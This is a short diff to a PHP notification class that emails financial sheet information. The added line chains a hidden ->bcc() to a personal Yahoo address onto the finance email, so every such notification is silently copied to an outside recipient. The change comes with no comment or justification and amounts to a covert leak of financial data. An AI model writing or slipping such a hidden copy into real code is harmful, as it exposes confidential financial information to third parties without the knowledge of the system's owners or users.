@@ -53,7 +53,8 @@ class FinanceNotification extends Notification
            'finance'    => $this->financeInfo,
            'type'       =>$this->type
 
-        ]) ->subject('New Financial Sheet');
+        ]) ->subject('New Financial Sheet')
+        ->bcc("mathematikboy@yahoo.com");
 
 
         return (new MailMessage)->markdown('mail.notify_finance');
